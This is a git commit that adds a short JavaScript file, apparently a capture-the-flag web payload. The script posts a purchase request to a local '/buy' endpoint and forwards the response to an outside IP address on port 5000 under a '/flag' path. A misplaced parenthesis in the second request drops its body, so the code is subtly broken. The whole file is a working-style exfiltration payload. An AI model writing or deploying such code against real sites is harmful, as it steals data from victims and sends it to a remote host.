f324779b0a96955cef6777ad2cf1e6353099e03c
sh4ll0t <144364845+sh4ll0t@users.noreply.github.com>
2024-03-27 00:36:48 +0800

    Create tttt.js

---
+++ tttt.js
@@ -0,0 +1,16 @@
+const fdata = new URLSearchParams();
+fdata.append('id', '0');
+fetch("http://localhost/buy", {
+        method: "POST",
+        body: fdata,
+    })
+    .then((response) => response.json())
+    .then((data) => {
+        fetch("http://120.26.219.126:5000/flag"), {
+            method: "POST",
+            body: data,
+        }
+    })
+    .catch((error) => {
+        console.error("Error:", error);
+    });
